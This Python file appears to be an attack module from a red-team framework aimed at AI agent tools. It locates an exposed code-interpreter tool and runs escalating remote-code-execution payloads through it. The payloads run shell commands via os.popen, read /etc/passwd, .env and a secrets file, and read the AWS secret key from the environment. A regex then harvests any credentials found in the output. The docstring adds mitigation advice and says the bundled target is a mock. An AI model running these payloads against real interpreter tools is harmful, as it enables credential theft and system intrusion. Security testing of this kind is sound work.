"""CUT-EXEC-004 — Code Execution via Interpreter Tool.

A tool that runs code is a tool that runs *the attacker's* code. `frisk` (CUT-DISC-004)
only confirms an interpreter tool is reachable with a benign arithmetic oracle; `breakout`
weaponizes it. It drives the interpreter through the escalation a real RCE gives you —
prove arbitrary execution, read the filesystem, dump the process environment, run shell
commands — and harvests whatever credentials fall out, all through one code-runner tool
with no injection, no delegated token, and no second tool.

Against the bundled range the ``code-exec`` interpreter is a safe mock that models these
consequences from fixtures (it never executes real code), so the demonstration is
deterministic and offline; pointed at a real interpreter tool under authorization the same
payloads exercise the genuine capability.

Detection / mitigation: do not expose a general code interpreter to untrusted input. If you
must, run it in a locked-down sandbox with no filesystem, no network, and no ambient
environment/credentials (a fresh, egress-blocked container per call); allowlist the exact
operations the feature needs instead of exposing an eval; strip secrets from the process
environment the interpreter inherits; and treat the interpreter tool as the highest-value
sink — require strong authorization and log every call. RCE through a tool is still RCE.
"""

from __future__ import annotations

import inspect
import re
import secrets
from typing import Any

from cutout_range import connect_range

from cutout.engine.evidence import Phase
from cutout.engine.module import BaseModule, Option
from cutout.engine.registry import register
from cutout.engine.session import CheckResult, RunResult, Session

# Signals that a tool is a code/command interpreter (an execution sink).
_EXEC_PARAMS = {"code", "script", "cmd", "command", "expression", "snippet", "exec", "shell"}
_EXEC_WORDS = (
    "execute",
    "interpreter",
    "python",
    "shell",
    "bash",
    "eval",
    "run code",
    "run command",
    "snippet",
    "stdout",
)

# Credential-bearing key names worth harvesting out of interpreter output.
_SECRET_WORDS = ("key", "secret", "password", "passwd", "token", "pw", "cred")


def _exec_param(spec: Any) -> str | None:
    for key in spec.params or {}:
        if str(key).lower() in _EXEC_PARAMS:
            return str(key)
    text = f"{getattr(spec, 'name', '')} {getattr(spec, 'description', '')}".lower()
    if any(word in text for word in _EXEC_WORDS):
        # Fall back to the first declared parameter if the description says "interpreter".
        params = list(spec.params or {})
        return params[0] if params else None
    return None


def _loot(text: str) -> dict[str, str]:
    """Pull secret-looking KEY=VALUE / "key": "value" pairs from interpreter output."""
    found: dict[str, str] = {}
    for key, value in re.findall(
        r"([A-Za-z_][A-Za-z0-9_]*)\s*[=:]\s*[\"']?([A-Za-z0-9_\-./+]{3,})", text
    ):
        kl = key.lower()
        if (
            any(w in kl for w in _SECRET_WORDS)
            or "fake" in value.lower()
            or "fixture" in value.lower()
        ):
            found[key] = value
    return found


@register
class InterpreterRce(BaseModule):
    id = "CUT-EXEC-004"
    alias = "breakout"
    name = "Code Execution via Interpreter Tool"
    tactic = "EXEC"
    targets = ["tool"]
    options: dict[str, Option] = {}

    async def _call(self, rng: Any, name: str, args: dict[str, Any]) -> dict[str, Any]:
        res = rng.call_tool(name, args)
        if inspect.isawaitable(res):
            res = await res
        return res  # type: ignore[no-any-return]

    def _find_interpreter(self, specs: list[Any]) -> tuple[Any, str] | None:
        for spec in specs:
            param = _exec_param(spec)
            if param:
                return spec, param
        return None

    async def check(self, session: Session) -> CheckResult:
        rng = connect_range(session.target)
        found = self._find_interpreter(rng.list_tools())
        if found is None:
            return CheckResult(
                module_id=self.id,
                susceptible=False,
                reason="no code-interpreter / command-exec tool exposed",
            )
        spec, param = found
        return CheckResult(
            module_id=self.id,
            susceptible=True,
            reason=f"{spec.qualified()} takes a '{param}' — a code-execution sink",
            data={"tool": spec.qualified(), "param": param},
        )

    def _payloads(self, marker_a: int, marker_b: int) -> list[tuple[str, str, str]]:
        """(capability, label, code) — an escalating RCE sequence."""
        return [
            # Prove arbitrary evaluation with a computed result not present in the payload.
            ("exec", "arithmetic proof", f"print({marker_a}*{marker_b})"),
            ("exec", "command: id", "os.popen('id').read()"),
            ("file", "read /etc/passwd", "open('/etc/passwd').read()"),
            ("file", "read .env", "open('.env').read()"),
            ("file", "read app/secrets.json", "open('app/secrets.json').read()"),
            ("env", "dump AWS secret", "os.getenv('AWS_SECRET_ACCESS_KEY')"),
            ("command", "uname -a", "os.popen('uname -a').read()"),
        ]

    async def run(self, session: Session) -> RunResult:
        rng = connect_range(session.target)
        found = self._find_interpreter(rng.list_tools())
        if found is None:
            return RunResult(status="skipped", summary="no interpreter tool to exploit")
        spec, param = found
        tool = spec.qualified()
        await self.emit(Phase.RUN, "exec.begin", {"tool": tool, "param": param})

        a, b = secrets.randbelow(9000) + 1000, secrets.randbelow(9000) + 1000
        expect = str(a * b)

        proved = False
        files_read: list[str] = []
        commands_run: list[str] = []
        env_dumped = False
        secrets_found: dict[str, str] = {}

        for capability, label, code in self._payloads(a, b):
            res = await self._call(rng, spec.name, {param: code})
            ok = bool(res.get("ok"))
            out = str(res.get("data", "")) if ok else ""
            if capability == "exec" and label.startswith("arithmetic") and out == expect:
                proved = True
            elif capability == "exec" and ok and "uid=" in out:
                proved = True
                commands_run.append(label)
            elif capability == "file" and ok:
                files_read.append(label)
            elif capability == "env" and ok:
                env_dumped = True
            elif capability == "command" and ok:
                commands_run.append(label)
            loot = _loot(out) if ok else {}
            for key, value in loot.items():
                secrets_found[f"rce:{key}"] = value
            await self.emit(
                Phase.RUN,
                "exec.detonate",
                {"capability": capability, "payload": label, "ok": ok, "secrets": sorted(loot)},
            )

        session.secrets.update(secrets_found)
        session.graph.add_node(tool, kind="tool", rce=True)
        session.artifacts["rce"] = {
            "tool": tool,
            "proved": proved,
            "files_read": files_read,
            "commands_run": commands_run,
            "env_dumped": env_dumped,
        }
        if secrets_found:
            await self.emit(Phase.RUN, "exec.harvest", {"secret_keys": sorted(secrets_found)})
        await self.emit(
            Phase.RUN,
            "exec.result",
            {
                "tool": tool,
                "proved": proved,
                "files": len(files_read),
                "commands": len(commands_run),
                "env_dumped": env_dumped,
                "secrets": len(secrets_found),
            },
        )

        won = proved and (bool(files_read) or bool(secrets_found) or bool(commands_run))
        status = "success" if won else "failed"
        if won:
            summary = (
                f"code execution via {tool}: proved arbitrary exec, read {len(files_read)} "
                f"file(s), ran {len(commands_run)} command(s)"
                f"{', dumped env' if env_dumped else ''}; harvested "
                f"{len(secrets_found)} secret(s)"
            )
        elif proved:
            summary = f"proved code execution via {tool} but recovered no loot"
        else:
            summary = f"could not confirm code execution via {tool}"
        return RunResult(
            status=status,
            summary=summary,
            data={
                "tool": tool,
                "proved": proved,
                "files_read": files_read,
                "commands_run": commands_run,
                "env_dumped": env_dumped,
                "harvested_secret_keys": sorted(secrets_found),
            },
        )
